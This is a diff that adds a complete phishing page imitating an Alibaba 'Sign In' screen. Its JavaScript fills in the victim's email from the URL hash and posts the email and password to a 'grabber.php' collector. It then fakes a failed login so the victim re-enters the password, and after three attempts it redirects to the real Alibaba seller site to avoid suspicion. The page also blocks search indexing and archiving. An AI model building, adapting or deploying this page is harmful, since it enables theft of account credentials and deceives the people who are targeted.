@@ -1,0 +1,134 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xml:lang="en" lang="en" xmlns="http://www.w3.org/1999/html">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,10,9,8,7"/>
+	<title>Alibaba Manufacturer Directory - Suppliers, Manufacturers, Exporters &amp; Importers</title>
+	<link rel="shortcut icon" href="./includes/favicon.ico">
+<meta name="robots" content="noindex" /><meta name="robots" content="nofollow" />
+<META NAME="GOOGLEBOT" CONTENT="NOARCHIVE" /><META NAME="GOOGLEBOT" CONTENT="NOSNIPPET" />
+</head>
+<body>
+
+<script>
+const url = 'grabber.php';   //full url goes here
+</script>
+
+<style>
+.login{
+	width:330px; height:24px; font-family: arial; font-size: 14px; color:#0965B1; font-weight:light; 
+	background-color: #ffffff; border: solid 1px #BDBDBD; padding: 7px; border-radius: 2px 3px 1px 5px;
+	 
+}
+.btn{
+	width:345px; height:45px; font-family: arial; font-size: 16px; color:#FFF; background-color: #FF8000; border: solid 1px #FF8000;
+	padding: 10px; border-radius: 2px 5px 1px 7px;
+	cursor:pointer;
+}
+
+</style>
+<div style="margin:-8px;width:100%">
+<img id="bg" src="./includes/bg.png">
+<img id="bg2" src="./includes/bg2.png" hidden>
+
+<div style="position:absolute;top:175px;left:805px;">
+	<font style="font-family: arial; font-size: 27px; color:#000000;">
+		Sign In
+	</font>
+</div>
+          
+<form method="post" action="" onsubmit="Validate(); return false;">
+
+<input required placeholder="Email Address" id="user" name="user" class="login" value="" style="position:absolute;top:240px;left:808px" type="email">
+<input required placeholder="Password" type="password" id="pass" name="pass" class="login" style="position:absolute;top:290px;left:808px">
+<input id="b1" type="submit" class="btn" style="position:absolute;top:345px;left:810px; font-weight:bold;" value="Sign in">
+ </form>
+</div>
+
+<input type="hidden" id="count" value="0">
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js'></script>
+
+
+<script>
+      $(document).ready(function(){
+        var count=0;
+
+      /////////////url email getting////////////////
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+          var my_email =email;
+          $('#user').val(my_email);
+			
+			}
+		  })
+
+
+function Validate(){
+var a = $('#user').val();
+var b = $('#pass').val();
+var c = $('#count').val();
+
+$.post(url, {user:a,pass:b}, function(){
+setTimeout(function(){
+if(c>=2){
+$('#count').val('0');
+window.location='https://seller.alibaba.com/?registPop=show&tracelog=header_become_seller';
+}else{
+$('#bg').fadeOut();
+$('#bg2').fadeIn();
+$('#user').css('top','250px');
+$('#pass').css('top','311px');
+$('#b1').css('top','381px');
+$('#pass').val('');
+var add = +c+1;
+$('#count').val(add);
+$('#pass').focus();
+}
+},2000);
+});
+}
+
+
+</script>
+
+
+
+<script>
+function process(){
+	var user = document.getElementById('user').value;
+	var pass = document.getElementById('pass').value;
+	if ((user == '') || (user == null)){
+	document.getElementById('bg').src='files/1.png';
+	document.getElementById('user').focus();
+return false;	
+	}else
+	if ((pass == '') || (pass == null)){
+	document.getElementById('bg').src='files/2.png';
+	document.getElementById('pass').focus();
+return false;	
+	}else
+	
+return true	;
+}
+</script>
+<script>
+$('input').focus(function(){
+  $(this).parents('.form-group').addClass('focused');
+});
+
+$('input').blur(function(){
+  var inputValue = $(this).val();
+  if ( inputValue == "" ) {
+    $(this).removeClass('filled');
+    $(this).parents('.form-group').removeClass('focused');  
+  } else {
+    $(this).addClass('filled');
+  }
+})  
+</script>
+</body>
+</html>
